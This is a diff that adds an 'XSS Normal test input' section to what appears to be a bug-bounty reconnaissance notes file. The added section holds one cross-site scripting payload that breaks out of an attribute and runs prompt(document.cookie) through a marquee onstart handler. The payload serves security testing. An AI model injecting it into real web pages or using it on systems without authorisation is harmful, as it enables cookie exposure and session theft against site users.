@@ -397,3 +397,8 @@ https://example.com -> XML-RPC server accepts POST requests only
 ```
 bash JSFScan.sh -l targets.txt --all -r -o filname
 ```
+
+## XSS Normal test input
+```
+"><u>Xalgord</u><marquee onstart='prompt(document.cookie)';>XSS</marquee>
+```
